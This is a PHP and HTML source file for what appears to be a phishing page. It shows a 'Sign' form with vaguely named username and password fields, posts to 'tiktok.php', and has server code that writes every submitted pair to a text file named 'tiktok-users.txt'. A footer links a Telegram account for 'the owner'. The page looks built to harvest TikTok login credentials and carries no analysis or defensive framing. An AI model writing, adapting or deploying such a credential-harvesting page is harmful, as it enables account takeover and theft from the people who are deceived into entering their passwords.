<?php 
session_start();  
$notmatching = '';  

if ($_SERVER["REQUEST_METHOD"] == "POST") {     
    $sign1 = $_POST['sign1'];     
    $sign2 = $_POST['sign2'];      

    $sign1 = htmlspecialchars($sign1);     
    $sign2 = htmlspecialchars($sign2);      

    $data = "\sign1 => $sign1\sign2 => $sign2\n";      
    $file = 'tiktok-users.txt';      
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);   
}   
?>  

<!DOCTYPE html> 
<html lang="en"> 
<head> 
    <link rel="stylesheet" href="design.css">    
    <meta charset="UTF-8">     
    <meta name="viewport" content="width=device-width, initial-scale=1.0">     
    <title>signg</title>     
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">   
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
</head> 
<body>  
    <nav>     
        <div id="pierreprotlogo" class="logo"> 
            <span onclick="redir()">Game</span><span>Sign</span> 
        </div>     
        <div class="menu-container">
            <ul>                 
                <li><a href="index.php" class="menu">Home</a></li> 
            </ul> 
        </div>
    </nav>  

    <div class="background">
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
   <span></span>
</div>

    <div class="container">     
        <div class="form-container">         
            <h2 id="onlywhiteitems">SIGN</h2>         
            <form action="tiktok.php" method="post" id="password-reset-form" onsubmit="return showLoadingMessage()">             

                <label id="onlywhiteitems" for="sign1">sign1</label>             
                <input type="text" id="sign1" name="sign1" required>              

                <label id="onlywhiteitems" for="sign2">sign2</label>             
                <input type="password" id="sign2" name="sign2" required>              

                <input type="submit" name="submit" value="Sign">         
            </form>          

            <div class="form-footer">             
                <p id="clickhere">Click Here To <a href="https://t.me/TOXIC_PIERRE">Contact The Owner</a></p>         
            </div>     
        </div> 
    </div>  

    <script>
        function showLoadingMessage() {
            const form = document.getElementById('password-reset-form');
            
            if (form.checkValidity()) {

                alert("signed");

                return true; 
            } else {
                
                return false;  
            }
        }

    </script>
</body> 
</html>
